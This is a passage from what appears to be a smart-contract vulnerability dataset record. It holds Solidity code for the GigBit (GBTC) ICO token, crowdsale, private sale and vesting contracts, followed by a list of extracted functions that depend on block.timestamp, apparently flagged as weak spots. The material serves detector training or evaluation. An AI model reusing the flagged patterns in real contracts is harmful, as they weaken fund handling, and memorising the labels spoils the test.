_to, uint256 _value) public returns (bool success) {\n if (locked) {\n return false;\n }\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintingERC20 is GigERC20 {\n using SafeMath for uint256;\n mapping (address => bool) public minters;\n uint256 public maxSupply;\n modifier onlyMinters () {\n require(true == minters[msg.sender]);\n _;\n }\n function MintingERC20(\n uint256 _initialSupply,\n uint256 _maxSupply,\n string _tokenName,\n uint8 _decimals,\n string _symbol,\n bool _transferAllSupplyToOwner,\n bool _locked\n )\n public GigERC20(_initialSupply, _tokenName, _decimals, _symbol, _transferAllSupplyToOwner, _locked)\n {\n standard = \"MintingERC20 0.1\";\n minters[msg.sender] = true;\n maxSupply = _maxSupply;\n }\n function addMinter(address _newMinter) public onlyOwner {\n minters[_newMinter] = true;\n }\n function removeMinter(address _minter) public onlyOwner {\n minters[_minter] = false;\n }\n function mint(address _addr, uint256 _amount) public onlyMinters returns (uint256) {\n if (true == locked) {\n return uint256(0);\n }\n if (_amount == uint256(0)) {\n return uint256(0);\n }\n if (totalSupply_.add(_amount) > maxSupply) {\n return uint256(0);\n }\n totalSupply_ = totalSupply_.add(_amount);\n balances[_addr] = balances[_addr].add(_amount);\n Transfer(address(0), _addr, _amount);\n return _amount;\n }\n}\ncontract GigToken is MintingERC20 {\n SellableToken public crowdSale;\n SellableToken public privateSale;\n bool public transferFrozen = false;\n uint256 public crowdSaleEndTime;\n mapping(address => uint256) public lockedBalancesReleasedAfterOneYear;\n modifier onlyCrowdSale() {\n require(crowdSale != address(0) && msg.sender == address(crowdSale));\n _;\n }\n modifier onlySales() {\n require((privateSale != address(0) && msg.sender == address(privateSale)) ||\n (crowdSale != address(0) && msg.sender == address(crowdSale)));\n _;\n }\n event MaxSupplyBurned(uint256 burnedTokens);\n function GigToken(bool _locked) public\n MintingERC20(0, maxSupply, 'GigBit', 18, 'GBTC', false, _locked)\n {\n standard = 'GBTC 0.1';\n maxSupply = uint256(1000000000).mul(uint256(10) ** decimals);\n }\n function setCrowdSale(address _crowdSale) public onlyOwner {\n require(_crowdSale != address(0));\n crowdSale = SellableToken(_crowdSale);\n crowdSaleEndTime = crowdSale.endTime();\n }\n function setPrivateSale(address _privateSale) public onlyOwner {\n require(_privateSale != address(0));\n privateSale = SellableToken(_privateSale);\n }\n function freezing(bool _transferFrozen) public onlyOwner {\n transferFrozen = _transferFrozen;\n }\n function isTransferAllowed(address _from, uint256 _value) public view returns (bool status) {\n uint256 senderBalance = balanceOf(_from);\n if (transferFrozen == true || senderBalance < _value) {\n return false;\n }\n uint256 lockedBalance = lockedBalancesReleasedAfterOneYear[_from];\n if (lockedBalance > 0 && senderBalance.sub(_value) < lockedBalance) {\n uint256 unlockTime = crowdSaleEndTime + 1 years;\n if (crowdSaleEndTime == 0 || block.timestamp < unlockTime) {\n return false;\n }\n uint256 secsFromUnlock = block.timestamp.sub(unlockTime);\n uint256 months = secsFromUnlock / 30 days;\n if (months > 12) {\n months = 12;\n }\n uint256 tokensPerMonth = lockedBalance / 12;\n uint256 unlockedBalance = tokensPerMonth.mul(months);\n uint256 actualLockedBalance = lockedBalance.sub(unlockedBalance);\n if (senderBalance.sub(_value) < actualLockedBalance) {\n return false;\n }\n }\n if (block.timestamp < crowdSaleEndTime &&\n crowdSale != address(0) &&\n crowdSale.isTransferAllowed(_from, _value) == false\n ) {\n return false;\n }\n return true;\n }\n function transfer(address _to, uint _value) public returns (bool) {\n require(isTransferAllowed(msg.sender, _value));\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) public returns (bool success) {\n require((crowdSaleEndTime <= block.timestamp) && isTransferAllowed(_from, _value));\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n require(crowdSaleEndTime <= block.timestamp);\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {\n require(crowdSaleEndTime <= block.timestamp);\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {\n require(crowdSaleEndTime <= block.timestamp);\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n function increaseLockedBalance(address _address, uint256 _tokens) public onlySales {\n lockedBalancesReleasedAfterOneYear[_address] =\n lockedBalancesReleasedAfterOneYear[_address].add(_tokens);\n }\n function burnInvestorTokens(\n address _address,\n uint256 _amount\n ) public onlyCrowdSale returns (uint256) {\n require(block.timestamp > crowdSaleEndTime);\n require(_amount <= balances[_address]);\n balances[_address] = balances[_address].sub(_amount);\n totalSupply_ = totalSupply_.sub(_amount);\n Transfer(_address, address(0), _amount);\n return _amount;\n }\n function burnUnsoldTokens(uint256 _amount) public onlyCrowdSale {\n require(block.timestamp > crowdSaleEndTime);\n maxSupply = maxSupply.sub(_amount);\n MaxSupplyBurned(_amount);\n }\n}\ncontract SellableToken is Multivest {\n uint256 public constant MONTH_IN_SEC = 2629743;\n GigToken public token;\n uint256 public minPurchase = 100 * 10 ** 5;\n uint256 public maxPurchase;\n uint256 public softCap;\n uint256 public hardCap;\n uint256 public startTime;\n uint256 public endTime;\n uint256 public maxTokenSupply;\n uint256 public soldTokens;\n uint256 public collectedEthers;\n address public etherHolder;\n uint256 public collectedUSD;\n uint256 public etherPriceInUSD;\n uint256 public priceUpdateAt;\n mapping(address => uint256) public etherBalances;\n Tier[] public tiers;\n struct Tier {\n uint256 discount;\n uint256 startTime;\n uint256 endTime;\n }\n event Refund(address _holder, uint256 _ethers, uint256 _tokens);\n event NewPriceTicker(string _price);\n function SellableToken(\n address _token,\n address _etherHolder,\n uint256 _startTime,\n uint256 _endTime,\n uint256 _maxTokenSupply,\n uint256 _etherPriceInUSD\n )\n public Multivest()\n {\n require(_token != address(0) && _etherHolder != address(0));\n token = GigToken(_token);\n require(_startTime < _endTime);\n etherHolder = _etherHolder;\n require((_maxTokenSupply == uint256(0)) || (_maxTokenSupply <= token.maxSupply()));\n startTime = _startTime;\n endTime = _endTime;\n maxTokenSupply = _maxTokenSupply;\n etherPriceInUSD = _etherPriceInUSD;\n priceUpdateAt = block.timestamp;\n }\n function setTokenContract(address _token) public onlyOwner {\n require(_token != address(0));\n token = GigToken(_token);\n }\n function setEtherHolder(address _etherHolder) public onlyOwner {\n if (_etherHolder != address(0)) {\n etherHolder = _etherHolder;\n }\n }\n function setPurchaseLimits(uint256 _min, uint256 _max) public onlyOwner {\n if (_min < _max) {\n minPurchase = _min;\n maxPurchase = _max;\n }\n }\n function mint(address _address, uint256 _tokenAmount) public onlyOwner returns (uint256) {\n return mintInternal(_address, _tokenAmount);\n }\n function isActive() public view returns (bool);\n function isTransferAllowed(address _from, uint256 _value) public view returns (bool);\n function withinPeriod() public view returns (bool);\n function getMinEthersInvestment() public view returns (uint256) {\n return uint256(1 ether).mul(minPurchase).div(etherPriceInUSD);\n }\n function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount);\n function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 bonus);\n function updatePreICOMaxTokenSupply(uint256 _amount) public;\n function setEtherInUSD(string _price) public onlyAllowedMultivests(msg.sender) {\n bytes memory bytePrice = bytes(_price);\n uint256 dot = bytePrice.length.sub(uint256(6));\n require(0x2e == uint(bytePrice[dot]));\n uint256 newPrice = uint256(10 ** 23).div(parseInt(_price, 5));\n require(newPrice > 0);\n etherPriceInUSD = parseInt(_price, 5);\n priceUpdateAt = block.timestamp;\n NewPriceTicker(_price);\n }\n function mintInternal(address _address, uint256 _tokenAmount) internal returns (uint256) {\n uint256 mintedAmount = token.mint(_address, _tokenAmount);\n require(mintedAmount == _tokenAmount);\n soldTokens = soldTokens.add(_tokenAmount);\n if (maxTokenSupply > 0) {\n require(maxTokenSupply >= soldTokens);\n }\n return _tokenAmount;\n }\n function transferEthers() internal;\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint res = 0;\n bool decimals = false;\n for (uint i = 0; i < bresult.length; i++) {\n if ((bresult[i] >= 48) && (bresult[i] <= 57)) {\n if (decimals) {\n if (_b == 0) break;\n else _b--;\n }\n res *= 10;\n res += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) res *= 10 ** _b;\n return res;\n }\n}\ncontract TokenAllocation is Ownable {\n using SafeERC20 for ERC20Basic;\n using SafeMath for uint256;\n address public ecosystemIncentive = 0xd339D9aeDFFa244E09874D65290c09d64b2356E0;\n address public marketingAndBounty = 0x26d6EF95A51BF0A2048Def4Fb7c548c3BDE37410;\n address public liquidityFund = 0x3D458b6f9024CDD9A2a7528c2E6451DD3b29e4cc;\n address public treasure = 0x00dEaFC5959Dd0E164bB00D06B08d972A276bf8E;\n address public amirShaikh = 0x31b17e7a2F86d878429C03f3916d17555C0d4884;\n address public sadiqHameed = 0x27B5cb71ff083Bd6a34764fBf82700b3669137f3;\n address public omairLatif = 0x92Db818bF10Bf3BfB73942bbB1f184274aA63833;\n uint256 public icoEndTime;\n address public vestingApplicature;\n address public vestingSimonCocking;\n address public vestingNathanChristian;\n address public vestingEdwinVanBerg;\n mapping(address => bool) public tokenInited;\n address[] public vestings;\n event VestingCreated(\n address _vesting,\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n uint256 _periods,\n bool _revocable\n );\n event VestingRevoked(address _vesting);\n function setICOEndTime(uint256 _icoEndTime) public onlyOwner {\n icoEndTime = _icoEndTime;\n }\n function initVesting() public onlyOwner() {\n require(vestingApplicature == address(0) &&\n vestingSimonCocking == address(0) &&\n vestingNathanChristian == address(0) &&\n vestingEdwinVanBerg == address(0) &&\n icoEndTime != 0\n );\n uint256 oneYearAfterIcoEnd = icoEndTime.add(1 years);\n vestingApplicature = createVesting(\n 0x760864dcdC58FDA80dB6883ce442B6ce44921Cf9, oneYearAfterIcoEnd, 0, 1 years, 2, false\n );\n vestingSimonCocking = createVesting(\n 0x7f438d78a51886B24752941ba98Cc00aBA217495, oneYearAfterIcoEnd, 0, 1 years, 2, true\n );\n vestingNathanChristian = createVesting(\n 0xfD86B8B016de558Fe39B1697cBf525592A233B2c, oneYearAfterIcoEnd, 0, 1 years, 2, true\n );\n vestingEdwinVanBerg = createVesting(\n 0x2451A73F35874028217bC833462CCd90c72dbE6D, oneYearAfterIcoEnd, 0, 1 years, 2, true\n );\n }\n function allocate(MintingERC20 token) public onlyOwner() {\n require(tokenInited[token] == false);\n tokenInited[token] = true;\n require(vestingApplicature != address(0));\n require(vestingSimonCocking != address(0));\n require(vestingNathanChristian != address(0));\n require(vestingEdwinVanBerg != address(0));\n uint256 tokenPrecision = uint256(10) ** uint256(token.decimals());\n token.mint(ecosystemIncentive, 200000000 * tokenPrecision);\n token.mint(marketingAndBounty, 50000000 * tokenPrecision);\n token.mint(liquidityFund, 50000000 * tokenPrecision);\n token.mint(treasure, 200000000 * tokenPrecision);\n token.mint(amirShaikh, 73350000 * tokenPrecision);\n token.mint(sadiqHameed, 36675000 * tokenPrecision);\n token.mint(omairLatif, 36675000 * tokenPrecision);\n token.mint(vestingApplicature, 1500000 * tokenPrecision);\n token.mint(vestingSimonCocking, 750000 * tokenPrecision);\n token.mint(vestingNathanChristian, 750000 * tokenPrecision);\n token.mint(vestingEdwinVanBerg, 300000 * tokenPrecision);\n }\n function createVesting(\n address _beneficiary, uint256 _start, uint256 _cliff, uint256 _duration, uint256 _periods, bool _revocable\n ) public onlyOwner() returns (PeriodicTokenVesting) {\n PeriodicTokenVesting vesting = new PeriodicTokenVesting(\n _beneficiary, _start, _cliff, _duration, _periods, _revocable\n );\n vestings.push(vesting);\n VestingCreated(vesting, _beneficiary, _start, _cliff, _duration, _periods, _revocable);\n return vesting;\n }\n function revokeVesting(PeriodicTokenVesting _vesting, MintingERC20 token) public onlyOwner() {\n _vesting.revoke(token);\n VestingRevoked(_vesting);\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n function TokenVesting(address _beneficiary, uint256 _start, uint256 _cliff, uint256 _duration, bool _revocable) public {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (now < cliff) {\n return 0;\n } else if (now >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(now.sub(start)).div(duration);\n }\n }\n}\ncontract PeriodicTokenVesting is TokenVesting {\n uint256 public periods;\n function PeriodicTokenVesting(\n address _beneficiary, uint256 _start, uint256 _cliff, uint256 _duration, uint256 _periods, bool _revocable\n )\n public TokenVesting(_beneficiary, _start, _cliff, _duration, _revocable)\n {\n periods = _periods;\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (now < cliff) {\n return 0;\n } else if (now >= start.add(duration * periods) || revoked[token]) {\n return totalBalance;\n } else {\n uint256 periodTokens = totalBalance.div(periods);\n uint256 periodsOver = now.sub(start).div(duration) + 1;\n if (periodsOver >= periods) {\n return totalBalance;\n }\n return periodTokens.mul(periodsOver);\n }\n }\n}\ncontract PrivateSale is SellableToken {\n uint256 public price;\n uint256 public discount;\n SellableToken public crowdSale;\n function PrivateSale(\n address _token,\n address _etherHolder,\n uint256 _startTime,\n uint256 _endTime,\n uint256 _maxTokenSupply,\n uint256 _etherPriceInUSD\n ) public SellableToken(\n _token,\n _etherHolder,\n _startTime,\n _endTime,\n _maxTokenSupply,\n _etherPriceInUSD\n ) {\n price = 24800;\n discount = 75;\n }\n function changeSalePeriod(uint256 _start, uint256 _end) public onlyOwner {\n if (_start != 0 && _start < _end) {\n startTime = _start;\n endTime = _end;\n }\n }\n function isActive() public view returns (bool) {\n if (soldTokens == maxTokenSupply) {\n return false;\n }\n return withinPeriod();\n }\n function withinPeriod() public view returns (bool) {\n return block.timestamp >= startTime && block.timestamp <= endTime;\n }\n function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount) {\n if (_value == 0) {\n return (0, 0);\n }\n usdAmount = _value.mul(etherPriceInUSD);\n tokenAmount = usdAmount.div(price * (100 - discount) / 100);\n usdAmount = usdAmount.div(uint256(10) ** 18);\n if (usdAmount < minPurchase) {\n return (0, 0);\n }\n }\n function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 usdAmount) {\n if (_tokens == 0) {\n return (0, 0);\n }\n usdAmount = _tokens.mul((price * (100 - discount) / 100));\n ethers = usdAmount.div(etherPriceInUSD);\n if (ethers < getMinEthersInvestment()) {\n return (0, 0);\n }\n usdAmount = usdAmount.div(uint256(10) ** 18);\n }\n function getStats(uint256 _ethPerBtc) public view returns (\n uint256 start,\n uint256 end,\n uint256 sold,\n uint256 maxSupply,\n uint256 min,\n uint256 tokensPerEth,\n uint256 tokensPerBtc\n ) {\n start = startTime;\n end = endTime;\n sold = soldTokens;\n maxSupply = maxTokenSupply;\n min = minPurchase;\n uint256 usd;\n (tokensPerEth, usd) = calculateTokensAmount(1 ether);\n (tokensPerBtc, usd) = calculateTokensAmount(_ethPerBtc);\n }\n function setCrowdSale(address _crowdSale) public onlyOwner {\n require(_crowdSale != address(0));\n crowdSale = SellableToken(_crowdSale);\n }\n function moveUnsoldTokens() public onlyOwner {\n require(address(crowdSale) != address(0) && now >= endTime && !isActive() && maxTokenSupply > soldTokens);\n crowdSale.updatePreICOMaxTokenSupply(maxTokenSupply.sub(soldTokens));\n maxTokenSupply = soldTokens;\n }\n function updatePreICOMaxTokenSupply(uint256) public {\n require(false);\n }\n function isTransferAllowed(address, uint256) public view returns (bool) {\n return false;\n }\n function buy(address _address, uint256 _value) internal returns (bool) {\n if (_value == 0 || _address == address(0)) {\n return false;\n }\n uint256 tokenAmount;\n uint256 usdAmount;\n (tokenAmount, usdAmount) = calculateTokensAmount(_value);\n uint256 mintedAmount = mintInternal(_address, tokenAmount);\n collectedUSD = collectedUSD.add(usdAmount);\n require(usdAmount > 0 && mintedAmount > 0);\n collectedEthers = collectedEthers.add(_value);\n etherBalances[_address] = etherBalances[_address].add(_value);\n token.increaseLockedBalance(_address, mintedAmount);\n transferEthers();\n Contribution(_address, _value, tokenAmount);\n return true;\n }\n function transferEthers() internal {\n etherHolder.transfer(this.balance);\n }\n}\ncontract CrowdSale is SellableToken {\n uint256 public constant PRE_ICO_TIER_FIRST = 0;\n uint256 public constant PRE_ICO_TIER_LAST = 4;\n uint256 public constant ICO_TIER_FIRST = 5;\n uint256 public constant ICO_TIER_LAST = 8;\n SellableToken public privateSale;\n uint256 public price;\n Stats public preICOStats;\n mapping(address => uint256) public icoBalances;\n struct Stats {\n uint256 soldTokens;\n uint256 maxTokenSupply;\n uint256 collectedUSD;\n uint256 collectedEthers;\n bool burned;\n }\n function CrowdSale(\n address _token,\n address _etherHolder,\n uint256 _maxPreICOTokenSupply,\n uint256 _maxICOTokenSupply,\n uint256 _price,\n uint256[2] _preIcoDuration,\n uint256[2] _icoDuration,\n uint256 _etherPriceInUSD\n ) public\n SellableToken(\n _token,\n _etherHolder,\n _preIcoDuration[0],\n _icoDuration[1],\n _maxPreICOTokenSupply.add(_maxICOTokenSupply),\n _etherPriceInUSD\n ) {\n softCap = 250000000000;\n hardCap = 3578912800000;\n price = _price;\n preICOStats.maxTokenSupply = _maxPreICOTokenSupply;\n tiers.push(\n Tier(\n uint256(65),\n _preIcoDuration[0],\n _preIcoDuration[0].add(1 hours)\n )\n );\n tiers.push(\n Tier(\n uint256(60),\n _preIcoDuration[0].add(1 hours),\n _preIcoDuration[0].add(1 days)\n )\n );\n tiers.push(\n Tier(\n uint256(57),\n _preIcoDuration[0].add(1 days),\n _preIcoDuration[0].add(2 days)\n )\n );\n tiers.push(\n Tier(\n uint256(55),\n _preIcoDuration[0].add(2 days),\n _preIcoDuration[0].add(3 days)\n )\n );\n tiers.push(\n Tier(\n uint256(50),\n _preIcoDuration[0].add(3 days),\n _preIcoDuration[1]\n )\n );\n tiers.push(\n Tier(\n uint256(25),\n _icoDuration[0],\n _icoDuration[0].add(1 weeks)\n )\n );\n tiers.push(\n Tier(\n uint256(15),\n _icoDuration[0].add(1 weeks),\n _icoDuration[0].add(2 weeks)\n )\n );\n tiers.push(\n Tier(\n uint256(10),\n _icoDuration[0].add(2 weeks),\n _icoDuration[0].add(3 weeks)\n )\n );\n tiers.push(\n Tier(\n uint256(5),\n _icoDuration[0].add(3 weeks),\n _icoDuration[1]\n )\n );\n }\n function changeICODates(uint256 _tierId, uint256 _start, uint256 _end) public onlyOwner {\n require(_start != 0 && _start < _end && _tierId < tiers.length);\n Tier storage icoTier = tiers[_tierId];\n icoTier.startTime = _start;\n icoTier.endTime = _end;\n if (_tierId == PRE_ICO_TIER_FIRST) {\n startTime = _start;\n } else if (_tierId == ICO_TIER_LAST) {\n endTime = _end;\n }\n }\n function isActive() public view returns (bool) {\n if (hardCap == collectedUSD.add(preICOStats.collectedUSD)) {\n return false;\n }\n if (soldTokens == maxTokenSupply) {\n return false;\n }\n return withinPeriod();\n }\n function withinPeriod() public view returns (bool) {\n return getActiveTier() != tiers.length;\n }\n function setPrivateSale(address _privateSale) public onlyOwner {\n if (_privateSale != address(0)) {\n privateSale = SellableToken(_privateSale);\n }\n }\n function getActiveTier() public view returns (uint256) {\n for (uint256 i = 0; i < tiers.length; i++) {\n if (block.timestamp >= tiers[i].startTime && block.timestamp <= tiers[i].endTime) {\n return i;\n }\n }\n return uint256(tiers.length);\n }\n function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount) {\n if (_value == 0) {\n return (0, 0);\n }\n uint256 activeTier = getActiveTier();\n if (activeTier == tiers.length) {\n if (endTime < block.timestamp) {\n return (0, 0);\n }\n if (startTime > block.timestamp) {\n activeTier = PRE_ICO_TIER_FIRST;\n }\n }\n usdAmount = _value.mul(etherPriceInUSD);\n tokenAmount = usdAmount.div(price * (100 - tiers[activeTier].discount) / 100);\n usdAmount = usdAmount.div(uint256(10) ** 18);\n if (usdAmount < minPurchase) {\n return (0, 0);\n }\n }\n function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 usdAmount) {\n if (_tokens == 0) {\n return (0, 0);\n }\n uint256 activeTier = getActiveTier();\n if (activeTier == tiers.length) {\n if (endTime < block.timestamp) {\n return (0, 0);\n }\n if (startTime > block.timestamp) {\n activeTier = PRE_ICO_TIER_FIRST;\n }\n }\n usdAmount = _tokens.mul((price * (100 - tiers[activeTier].discount) / 100));\n ethers = usdAmount.div(etherPriceInUSD);\n if (ethers < getMinEthersInvestment()) {\n return (0, 0);\n }\n usdAmount = usdAmount.div(uint256(10) ** 18);\n }\n function getStats(uint256 _ethPerBtc) public view returns (\n uint256 sold,\n uint256 maxSupply,\n uint256 min,\n uint256 soft,\n uint256 hard,\n uint256 tokenPrice,\n uint256 tokensPerEth,\n uint256 tokensPerBtc,\n uint256[27] tiersData\n ) {\n sold = soldTokens;\n maxSupply = maxTokenSupply.sub(preICOStats.maxTokenSupply);\n min = minPurchase;\n soft = softCap;\n hard = hardCap;\n tokenPrice = price;\n uint256 usd;\n (tokensPerEth, usd) = calculateTokensAmount(1 ether);\n (tokensPerBtc, usd) = calculateTokensAmount(_ethPerBtc);\n uint256 j = 0;\n for (uint256 i = 0; i < tiers.length; i++) {\n tiersData[j++] = uint256(tiers[i].discount);\n tiersData[j++] = uint256(tiers[i].startTime);\n tiersData[j++] = uint256(tiers[i].endTime);\n }\n }\n function burnUnsoldTokens() public onlyOwner {\n if (block.timestamp >= endTime && maxTokenSupply > soldTokens) {\n token.burnUnsoldTokens(maxTokenSupply.sub(soldTokens));\n maxTokenSupply = soldTokens;\n }\n }\n function isTransferAllowed(address _from, uint256 _value) public view returns (bool status){\n if (collectedUSD.add(preICOStats.collectedUSD) < softCap) {\n if (token.balanceOf(_from) >= icoBalances[_from] && token.balanceOf(_from).sub(icoBalances[_from])> _value) {\n return true;\n }\n return false;\n }\n return true;\n }\n function isRefundPossible() public view returns (bool) {\n if (isActive() || block.timestamp < startTime || collectedUSD.add(preICOStats.collectedUSD) >= softCap) {\n return false;\n }\n return true;\n }\n function refund() public returns (bool) {\n if (!isRefundPossible() || etherBalances[msg.sender] == 0) {\n return false;\n }\n uint256 burnedAmount = token.burnInvestorTokens(msg.sender, icoBalances[msg.sender]);\n if (burnedAmount == 0) {\n return false;\n }\n uint256 etherBalance = etherBalances[msg.sender];\n etherBalances[msg.sender] = 0;\n msg.sender.transfer(etherBalance);\n Refund(msg.sender, etherBalance, burnedAmount);\n return true;\n }\n function updatePreICOMaxTokenSupply(uint256 _amount) public {\n if (msg.sender == address(privateSale)) {\n maxTokenSupply = maxTokenSupply.add(_amount);\n preICOStats.maxTokenSupply = preICOStats.maxTokenSupply.add(_amount);\n }\n }\n function moveUnsoldTokensToICO() public onlyOwner {\n uint256 unsoldTokens = preICOStats.maxTokenSupply - preICOStats.soldTokens;\n if (unsoldTokens > 0) {\n preICOStats.maxTokenSupply = preICOStats.soldTokens;\n }\n }\n function transferEthers() internal {\n if (collectedUSD.add(preICOStats.collectedUSD) >= softCap) {\n etherHolder.transfer(this.balance);\n }\n }\n function mintPreICO(\n address _address,\n uint256 _tokenAmount,\n uint256 _ethAmount,\n uint256 _usdAmount\n ) internal returns (uint256) {\n uint256 mintedAmount = token.mint(_address, _tokenAmount);\n require(mintedAmount == _tokenAmount);\n preICOStats.soldTokens = preICOStats.soldTokens.add(_tokenAmount);\n preICOStats.collectedEthers = preICOStats.collectedEthers.add(_ethAmount);\n preICOStats.collectedUSD = preICOStats.collectedUSD.add(_usdAmount);\n require(preICOStats.maxTokenSupply >= preICOStats.soldTokens);\n require(maxTokenSupply >= preICOStats.soldTokens);\n return _tokenAmount;\n }\n function buy(address _address, uint256 _value) internal returns (bool) {\n if (_value == 0 || _address == address(0)) {\n return false;\n }\n uint256 activeTier = getActiveTier();\n if (activeTier == tiers.length) {\n return false;\n }\n uint256 tokenAmount;\n uint256 usdAmount;\n uint256 mintedAmount;\n (tokenAmount, usdAmount) = calculateTokensAmount(_value);\n require(usdAmount > 0 && tokenAmount > 0);\n if (activeTier >= PRE_ICO_TIER_FIRST && activeTier <= PRE_ICO_TIER_LAST) {\n mintedAmount = mintPreICO(_address, tokenAmount, _value, usdAmount);\n etherHolder.transfer(this.balance);\n } else {\n mintedAmount = mintInternal(_address, tokenAmount);\n require(soldTokens <= maxTokenSupply.sub(preICOStats.maxTokenSupply));\n collectedUSD = collectedUSD.add(usdAmount);\n require(hardCap >= collectedUSD.add(preICOStats.collectedUSD) && usdAmount > 0 && mintedAmount > 0);\n collectedEthers = collectedEthers.add(_value);\n etherBalances[_address] = etherBalances[_address].add(_value);\n icoBalances[_address] = icoBalances[_address].add(tokenAmount);\n transferEthers();\n }\n Contribution(_address, _value, tokenAmount);\n return true;\n }\n}",
  "extract_feature": [
    "function isTransferAllowed(address _from, uint256 _value) public view returns (bool status) {\nuint256 senderBalance = balanceOf(_from);\nif (transferFrozen == true || senderBalance < _value) {\nreturn false;\n}\nuint256 lockedBalance = lockedBalancesReleasedAfterOneYear[_from];\nif (lockedBalance > 0 && senderBalance.sub(_value) < lockedBalance) {\nuint256 unlockTime = crowdSaleEndTime + 1 years;\nif (crowdSaleEndTime == 0 || block.timestamp < unlockTime) {\nreturn false;\n}\nuint256 secsFromUnlock = block.timestamp.sub(unlockTime);\nuint256 months = secsFromUnlock / 30 days;\nif (months > 12) {\nmonths = 12;\n}\nuint256 tokensPerMonth = lockedBalance / 12;\nuint256 unlockedBalance = tokensPerMonth.mul(months);\nuint256 actualLockedBalance = lockedBalance.sub(unlockedBalance);\nif (senderBalance.sub(_value) < actualLockedBalance) {\nreturn false;\n}\n}\nif (block.timestamp < crowdSaleEndTime &&\ncrowdSale != address(0) &&\ncrowdSale.isTransferAllowed(_from, _value) == false\n) {\nreturn false;\n}\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint _value) public returns (bool success) {\nrequire((crowdSaleEndTime <= block.timestamp) && isTransferAllowed(_from, _value));\nreturn super.transferFrom(_from, _to, _value);\n}",
    "function approve(address _spender, uint256 _value) public returns (bool success) {\nrequire(crowdSaleEndTime <= block.timestamp);\nreturn super.approve(_spender, _value);\n}",
    "function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {\nrequire(crowdSaleEndTime <= block.timestamp);\nreturn super.increaseApproval(_spender, _addedValue);\n}",
    "function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {\nrequire(crowdSaleEndTime <= block.timestamp);\nreturn super.decreaseApproval(_spender, _subtractedValue);\n}",
    "function burnUnsoldTokens(uint256 _amount) public onlyCrowdSale {\nrequire(block.timestamp > crowdSaleEndTime);\nmaxSupply = maxSupply.sub(_amount);\nMaxSupplyBurned(_amount);\n}",
    "function setEtherInUSD(string _price) public onlyAllowedMultivests(msg.sender) {\nbytes memory bytePrice = bytes(_price);\nuint256 dot = bytePrice.length.sub(uint256(6));\nrequire(0x2e == uint(bytePrice[dot]));\nuint256 newPrice = uint256(10 ** 23).div(parseInt(_price, 5));\nrequire(newPrice > 0);\netherPriceInUSD = parseInt(_price, 5);\npriceUpdateAt = block.timestamp;\nNewPriceTicker(_price);\n}",
    "function withinPeriod() public view returns (bool) {\nreturn block.timestamp >= startTime && block.timestamp <= endTime;\n}",
    "function getActiveTier() public view returns (uint256) {\nfor (uint256 i = 0; i < tiers.length; i++) {\nif (block.timestamp >= tiers[i].startTime && block.timestamp <= tiers[i].endTime) {\nreturn i;\n}\n}\nreturn uint256(tiers.length);\n}",
    "function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount) {\nif (_value == 0) {\nreturn (0, 0);\n}\nuint256 activeTier = getActiveTier();\nif (activeTier == tiers.length) {\nif (endTime < block.timestamp) {\nreturn (0, 0);\n}\nif (startTime > block.timestamp) {\nactiveTier = PRE_ICO_TIER_FIRST;\n}\n}\nusdAmount = _value.mul(etherPriceInUSD);\ntokenAmount = usdAmount.div(price * (100 - tiers[activeTier].discount) / 100);\nusdAmount = usdAmount.div(uint256(10) ** 18);\nif (usdAmount < minPurchase) {\nreturn (0, 0);\n}\n}",
